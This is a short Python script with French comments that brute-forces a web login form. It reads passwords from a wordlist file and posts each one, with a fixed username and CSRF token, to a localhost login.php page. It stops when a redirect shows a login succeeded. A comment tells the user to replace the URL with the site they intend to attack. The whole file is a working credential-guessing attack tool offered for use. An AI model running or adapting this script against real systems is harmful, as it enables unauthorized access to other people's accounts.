import requests
_token="77e3941b9ca17650861ffded5652647b"
file=open("./output/med-med.txt")
session_cookie_before = None
url = "http://localhost/ensab/query_string/login.php" #a changer avec l'url du siteWeb sur lequel vous allez lancez l'attaque
#data = {"key1": "value1", "key2": "value2"} #json data file.readlines()
for line in file.readlines(): #parcours du dicttionnaire
    line=line.rstrip('\n')
    
    data={"username":"54848","password":line,'_token':_token, "submit":''}
    response = requests.post(url, data=data)
    
    #tester si le lien est changé
    if "login.php" not in response.__dict__['url'] :
        print("right")
        print(f"The password is: {line}")
        break
   


